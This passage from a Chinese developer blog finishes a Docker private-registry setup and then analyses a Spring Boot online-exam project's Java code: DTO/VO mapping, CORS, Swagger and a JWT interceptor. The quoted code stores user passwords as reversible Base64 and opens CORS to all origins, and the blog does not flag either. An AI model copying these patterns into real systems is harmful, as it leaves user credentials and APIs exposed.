<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull registry</span><br></pre></td></tr></table></figure>

<p>私有仓库实际上也是一个容器，创建的操作与普通容器相似。</p>
<ul>
<li>启动私有仓库容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -di --name=registry -p 宿主机端口:映射端口 registry</span><br></pre></td></tr></table></figure>

<p>打开浏览器，输入地址http:&#x2F;&#x2F;宿主机IP: 端口&#x2F;v2&#x2F;_catalog，若看到<code>&#123;&quot;repositories&quot;:[]&#125;</code> 表示私有仓库搭建成功并且内容为空。</p>
<ul>
<li>修改daemon.json</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<ul>
<li>添加以下内容，保存退出。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;insecure-registries&quot;</span>:[<span class="string">&quot;宿主机IP:仓库端口&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>此步用于让 docker信任私有仓库地址，其中仓库端口为宿主机端口。</p>
<ul>
<li>重启docker 服务</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2 id="镜像上传至私有仓库"><a href="#镜像上传至私有仓库" class="headerlink" title="镜像上传至私有仓库"></a>镜像上传至私有仓库</h2><ul>
<li>标记此镜像为私有仓库的镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag 镜像名 宿主机IP:仓库端口/镜像名</span><br></pre></td></tr></table></figure>

<ul>
<li>再次启动私服容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start registry</span><br></pre></td></tr></table></figure>

<ul>
<li>上传标记的镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push 宿主机IP:仓库端口/镜像名</span><br></pre></td></tr></table></figure>

<ul>
<li>下载标记的镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull 宿主机IP:仓库端口/镜像名</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>online-exam项目分析</title>
    <url>/2021/12/01/2021/online-exam%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文是分析一个项目 </p>
<p><a class="link"   href="https://gitee.com/lsgwr/spring-boot-online-exam" >https://gitee.com/lsgwr/spring-boot-online-exam<i class="fas fa-external-link-alt"></i></a></p>
<p>大多是我很粗浅的理解</p>
<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><h2 id="json适配处理"><a href="#json适配处理" class="headerlink" title="json适配处理"></a>json适配处理</h2><p>在前端传过来的json数据，可能会出现不一致的情况，在这个项目中，使用到了<code>@JsonProperty</code>这个注解来帮助处理</p>
<p>这个注解是属于fastjson</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInfoVo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;id&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userId;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;avatar&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userAvatar;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;name&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userNickname;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;username&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userUsername;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="方法内适配"><a href="#方法内适配" class="headerlink" title="方法内适配"></a>方法内适配</h2><p>大量的方法是放在了service中进行处理</p>
<p>在注册的方法上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">register</span><span class="params">(RegisterDTO registerDTO)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setUserId(IdUtil.simpleUUID());</span><br><span class="line">        <span class="comment">// 好像还缺少个用户名,用&quot;exam_user_手机号&quot;来注册：需要校验唯一性数据字段已经设置unique了，失败会异常地</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">defaultUsername</span> <span class="operator">=</span> <span class="string">&quot;user&quot;</span>;</span><br><span class="line">        user.setUserUsername(defaultUsername + <span class="string">&quot;_&quot;</span> + registerDTO.getMobile());</span><br><span class="line">        <span class="comment">// 初始化昵称和用户名相同</span></span><br><span class="line">        user.setUserNickname(user.getUserUsername());</span><br><span class="line">        <span class="comment">// 这里还需要进行加密处理，后续解密用Base64.decode()</span></span><br><span class="line">        user.setUserPassword(Base64.encode(registerDTO.getPassword()));</span><br><span class="line">        <span class="comment">// 默认设置为学生身份，需要老师和学生身份地话需要管理员修改</span></span><br><span class="line">        user.setUserRoleId(RoleEnum.STUDENT.getId());</span><br><span class="line">        <span class="comment">// 设置头像图片地址, 先默认一个地址，后面用户可以自己再改</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">defaultAvatar</span> <span class="operator">=</span> <span class="string">&quot;http://d.lanrentuku.com/down/png/1904/business_avatar/8_avatar_2754583.png&quot;</span>;</span><br><span class="line">        user.setUserAvatar(defaultAvatar);</span><br><span class="line">        <span class="comment">// 设置描述信息，随便设置段默认的</span></span><br><span class="line">        user.setUserDescription(<span class="string">&quot;welcome to online exam system&quot;</span>);</span><br><span class="line">        <span class="comment">// 需要验证这个邮箱是不是已经存在：数据字段已经设置unique了，失败会异常地</span></span><br><span class="line">        user.setUserEmail(registerDTO.getEmail());</span><br><span class="line">        <span class="comment">// 需要验证手机号是否已经存在：数据字段已经设置unique了，失败会异常地</span></span><br><span class="line">        user.setUserPhone(registerDTO.getMobile());</span><br><span class="line">        userRepository.save(user);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace(); <span class="comment">// 用户已经存在</span></span><br><span class="line">        <span class="comment">// 出异常，返回null，表示注册失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在controller层上的处理就较为简单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/register&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(&quot;注册&quot;)</span></span><br><span class="line">ResultVO&lt;User&gt; <span class="title function_">register</span><span class="params">(<span class="meta">@RequestBody</span> RegisterDTO registerDTO)</span> &#123;</span><br><span class="line">    ResultVO&lt;User&gt; resultVO;</span><br><span class="line">    <span class="comment">// 注册信息的完善，还有唯一性校验没(用户名、邮箱和手机号)已经在user表中通过unique来设置了</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.register(registerDTO);</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 注册成功</span></span><br><span class="line">        resultVO = <span class="keyword">new</span> <span class="title class_">ResultVO</span>&lt;&gt;(ResultEnum.REGISTER_SUCCESS.getCode(), ResultEnum.REGISTER_SUCCESS.getMessage(), user);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resultVO = <span class="keyword">new</span> <span class="title class_">ResultVO</span>&lt;&gt;(ResultEnum.REGISTER_FAILED.getCode(), ResultEnum.REGISTER_FAILED.getMessage(), <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resultVO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仔细想为什么要这样处理</p>
<p>我认为是service的方法仅仅是为了完成某个处理，某个模块，比如返回注册的结果集。</p>
<p>至于前端的处理 就应该在controller中进行</p>
<h2 id="Entity-转-VO"><a href="#Entity-转-VO" class="headerlink" title="Entity 转 VO"></a>Entity 转 VO</h2><p>这个项目里很喜欢使用BeanUtils来进行处理</p>
<p>而实际上我们并不建议使用BeanUtils来处理，推荐使用</p>
<blockquote>
<p> 一般情况下，同样一个数据模型，我们在不同的层次要使用不同的数据模型。<strong>如在数据存储层，我们使用DO来抽象一个业务实体；在业务逻辑层，我们使用DTO来表示数据传输对象；到了展示层，我们又把对象封装成VO来与前端进行交互。</strong></p>
</blockquote>
<p>我们先看项目中的代码是如何完成的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;ExamCardVo&gt; <span class="title function_">getExamCardList</span><span class="params">()</span> &#123;</span><br><span class="line">    List&lt;Exam&gt; examList = examRepository.findAll();</span><br><span class="line">    List&lt;ExamCardVo&gt; examCardVoList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Exam exam : examList) &#123;</span><br><span class="line">        <span class="type">ExamCardVo</span> <span class="variable">examCardVo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExamCardVo</span>();</span><br><span class="line">        <span class="comment">// 这么喜欢用BeanUtils</span></span><br><span class="line">        BeanUtils.copyProperties(exam, examCardVo);</span><br><span class="line">        examCardVoList.add(examCardVo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> examCardVoList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一篇文章来诉说MapStruct的使用方法和主要原理</p>
<p><a class="link"   href="https://juejin.cn/post/6859213877474033672" >https://juejin.cn/post/6859213877474033672<i class="fas fa-external-link-alt"></i></a></p>
<p>具体就是maven–&gt;接口–&gt;转换方法</p>
<h2 id="处理封装"><a href="#处理封装" class="headerlink" title="处理封装"></a>处理封装</h2><p>首先是一个Entity和一个VO</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/***********************************************************</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> : 考试表，要有题目、总分数、时间限制、有效日期、创建者等字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      : 梁山广(Laing Shan Guang)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>        : 2019/5/14 07:42</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span>       : liangshanguang2@gmail.com</span></span><br><span class="line"><span class="comment"> ***********************************************************/</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@DynamicUpdate</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exam</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> String examId;</span><br><span class="line">    <span class="keyword">private</span> String examName;</span><br><span class="line">    <span class="keyword">private</span> String examAvatar;</span><br><span class="line">    <span class="keyword">private</span> String examDescription;</span><br><span class="line">    <span class="keyword">private</span> String examQuestionIds;</span><br><span class="line">    <span class="keyword">private</span> String examQuestionIdsRadio;</span><br><span class="line">    <span class="keyword">private</span> String examQuestionIdsCheck;</span><br><span class="line">    <span class="keyword">private</span> String examQuestionIdsJudge;</span><br><span class="line">    <span class="keyword">private</span> Integer examScore;</span><br><span class="line">    <span class="keyword">private</span> Integer examScoreRadio;</span><br><span class="line">    <span class="keyword">private</span> Integer examScoreCheck;</span><br><span class="line">    <span class="keyword">private</span> Integer examScoreJudge;</span><br><span class="line">    <span class="keyword">private</span> String examCreatorId;</span><br><span class="line">    <span class="keyword">private</span> Integer examTimeLimit;</span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date examStartDate;</span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date examEndDate;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建时间, 设计表时设置了自动插入当前时间，无需在Java代码中设置了</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新时间，设计表时设置了自动插入当前时间，无需在Java代码中设置了。</span></span><br><span class="line"><span class="comment">     * 同时<span class="doctag">@DynamicUpdate</span>注解可以时间当数据库数据变化时自动更新，无需人工维护</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下一个VO</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/***********************************************************</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> : 考试详情的实体类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      : 梁山广(Laing Shan Guang)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>        : 2019-06-24 08:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span>       : liangshanguang2@gmail.com</span></span><br><span class="line"><span class="comment"> ***********************************************************/</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExamDetailVo</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 考试的基本信息对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Exam exam;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 单选题的id数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String[] radioIds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 多选题的id数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String[] checkIds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断题的id数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String[] judgeIds;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>核心代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> ExamDetailVo <span class="title function_">getExamDetail</span><span class="params">(String id)</span> &#123;</span><br><span class="line">    <span class="type">Exam</span> <span class="variable">exam</span> <span class="operator">=</span> examRepository.findById(id).orElse(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">ExamDetailVo</span> <span class="variable">examDetailVo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExamDetailVo</span>();</span><br><span class="line">    <span class="comment">// 注入数据</span></span><br><span class="line">    examDetailVo.setExam(exam);</span><br><span class="line">    <span class="comment">// 我不喜欢这种assert</span></span><br><span class="line">    <span class="keyword">assert</span> exam != <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 继续注入</span></span><br><span class="line">    examDetailVo.setRadioIds(exam.getExamQuestionIdsRadio().split(<span class="string">&quot;-&quot;</span>));</span><br><span class="line">    examDetailVo.setCheckIds(exam.getExamQuestionIdsCheck().split(<span class="string">&quot;-&quot;</span>));</span><br><span class="line">    examDetailVo.setJudgeIds(exam.getExamQuestionIdsJudge().split(<span class="string">&quot;-&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> examDetailVo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>该处的处理是依靠多次查询数据库完成的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> QuestionDetailVo <span class="title function_">getQuestionDetail</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="comment">// 初次查询问题详情</span></span><br><span class="line">        <span class="type">Question</span> <span class="variable">question</span> <span class="operator">=</span> questionRepository.findById(id).orElse(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 往VO注入数据</span></span><br><span class="line">        <span class="type">QuestionDetailVo</span> <span class="variable">questionDetailVo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QuestionDetailVo</span>();</span><br><span class="line">        questionDetailVo.setId(id);</span><br><span class="line">        questionDetailVo.setName(question.getQuestionName());</span><br><span class="line">        questionDetailVo.setDescription(question.getQuestionDescription());</span><br><span class="line">        <span class="comment">// 问题类型，单选题/多选题/判断题</span></span><br><span class="line">        questionDetailVo.setType(</span><br><span class="line">                Objects.requireNonNull(</span><br><span class="line">                        questionTypeRepository.findById(</span><br><span class="line">                                question.getQuestionTypeId()</span><br><span class="line">                        ).orElse(<span class="literal">null</span>)</span><br><span class="line">                ).getQuestionTypeDescription()</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 获取当前问题的选项</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">optionIdsStr</span> <span class="operator">=</span> trimMiddleLine(question.getQuestionOptionIds());</span><br><span class="line">        String[] optionIds = optionIdsStr.split(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取选项列表</span></span><br><span class="line">        List&lt;QuestionOption&gt; optionList = questionOptionRepository.findAllById(Arrays.asList(optionIds));</span><br><span class="line">        questionDetailVo.setOptions(optionList);</span><br><span class="line">        <span class="keyword">return</span> questionDetailVo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这种方式其实很简单，但是我觉得难处在于如何设计，总的来说我们的目的就是完成VO的数据注入。</p>
<h1 id="跨域处理"><a href="#跨域处理" class="headerlink" title="跨域处理"></a>跨域处理</h1><p>直接贴代码就是了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CORSConf</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebMvcConfigurer <span class="title function_">corsConfigurer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurer</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> &#123;</span><br><span class="line">                log.info(<span class="string">&quot;初始化 CORSConfiguration 配置&quot;</span>);</span><br><span class="line">                registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                        .allowedHeaders(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                        .allowedMethods(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                        .allowedOrigins(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="swagger配置"><a href="#swagger配置" class="headerlink" title="swagger配置"></a>swagger配置</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Swagger2Config</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">api</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ParameterBuilder</span> <span class="variable">ticketPar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParameterBuilder</span>();</span><br><span class="line">        List&lt;Parameter&gt; pars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ticketPar.name(<span class="string">&quot;Access-Token&quot;</span>).description(<span class="string">&quot;Rest接口权限认证token,无需鉴权可为空&quot;</span>)</span><br><span class="line">                .modelRef(<span class="keyword">new</span> <span class="title class_">ModelRef</span>(<span class="string">&quot;string&quot;</span>)).parameterType(<span class="string">&quot;header&quot;</span>)</span><br><span class="line">                <span class="comment">//header中的ticket参数非必填，传空也可以</span></span><br><span class="line">                .required(<span class="literal">false</span>).build();</span><br><span class="line">        <span class="comment">//根据每个方法名也知道当前方法在设置什么参数</span></span><br><span class="line">        pars.add(ticketPar.build());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">                .apiInfo(apiInfo())</span><br><span class="line">                .select()</span><br><span class="line">                <span class="comment">// 自行修改为自己的包路径</span></span><br><span class="line">                .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;lsgwr&quot;</span>))</span><br><span class="line">                .paths(PathSelectors.any())</span><br><span class="line">                .build()</span><br><span class="line">                .globalOperationParameters(pars);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>()</span><br><span class="line">                .title(<span class="string">&quot;online exam by springboot&quot;</span>)</span><br><span class="line">                .description(<span class="string">&quot;在线考试系统 by 梁山广 at 2021&quot;</span>)</span><br><span class="line">                .termsOfServiceUrl(<span class="string">&quot;https://github.com/19920625lsg/spring-boot-online-exam&quot;</span>)</span><br><span class="line">                .version(<span class="string">&quot;2.0&quot;</span>)</span><br><span class="line">                .contact(<span class="keyword">new</span> <span class="title class_">Contact</span>(<span class="string">&quot;liangshanguang&quot;</span>, <span class="string">&quot;https://github.com/lsgwr/spring-boot-online-exam&quot;</span>, <span class="string">&quot;liangshanguang2@gmail.com&quot;</span>))</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="拦截器处理"><a href="#拦截器处理" class="headerlink" title="拦截器处理"></a>拦截器处理</h1><p>这里的拦截器是我们想要请求进入后端的时候，我们会校验token</p>
<p>允许哪些请求可以无token进入</p>
<p>这个项目的想法是在拦截器中查看请求<code>url</code>如果是登录注册的话，直接返回true</p>
<p>而实际上大部分的项目是依靠<code>WebMvcConfigurer</code>中使用<code>excludePathPatterns</code>来跳出查看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/***********************************************************</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> : 登录拦截器，主要用于校验Token</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      : 梁山广(Laing Shan Guang)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>        : 2019-05-22 07:35</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span>       : liangshanguang2@gmail.com</span></span><br><span class="line"><span class="comment"> ***********************************************************/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * https://stackoverflow.com/questions/43591582/application-properties-value-in-spring-boot-interceptor</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liangshanguang</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 有上面的<span class="doctag">@Component</span>才能使得这个属性能从pplication.yml中取得拦截器的值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;interceptors.auth-ignore-uris&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String authIgnoreUris;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 进入controller之前进行拦截</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request  请求体</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response 响应体</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handler  处理者</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 是否继续往下走</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 拦截中出的异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;进入拦截器啦！&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">        System.out.println(uri);</span><br><span class="line">        System.out.println(<span class="string">&quot;无需拦截的接口路径：&quot;</span> + authIgnoreUris);</span><br><span class="line">        String[] authIgnoreUriArr = authIgnoreUris.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="comment">// 登录和注册接口不需要进行token拦截和校验</span></span><br><span class="line">        <span class="keyword">for</span> (String authIgnoreUri : authIgnoreUriArr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (authIgnoreUri.equals(uri)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 注意要和前端适配Access-Token属性，前端会在登陆后的每个接口请求头加Access-Token属性</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Access-Token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// token不在header中时，也可能在参数中(RequestParam)</span></span><br><span class="line">            token = request.getParameter(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 请求中是携带参数的</span></span><br><span class="line">            <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> JwtUtils.checkJWT(token);</span><br><span class="line">            <span class="keyword">if</span> (claims == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 返回null说明用户篡改了token，导致校验失败</span></span><br><span class="line">                sendJsonMessage(response, JsonData.buildError(<span class="string">&quot;token无效，请重新登录&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 用户的的主键id</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="comment">// 用户名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="comment">// 把这两个参数放到请求中，从而可以在controller中获取到，不需要在controller中在用Jwt解密了,request.getAttribute(&quot;属性名&quot;)即可获取</span></span><br><span class="line">            request.setAttribute(<span class="string">&quot;user_id&quot;</span>, id);</span><br><span class="line">            request.setAttribute(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sendJsonMessage(response, JsonData.buildError(<span class="string">&quot;token为null,请先登录！&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 响应数据给前端</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response 响应</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> obj      返回的消息体</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 处理异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title 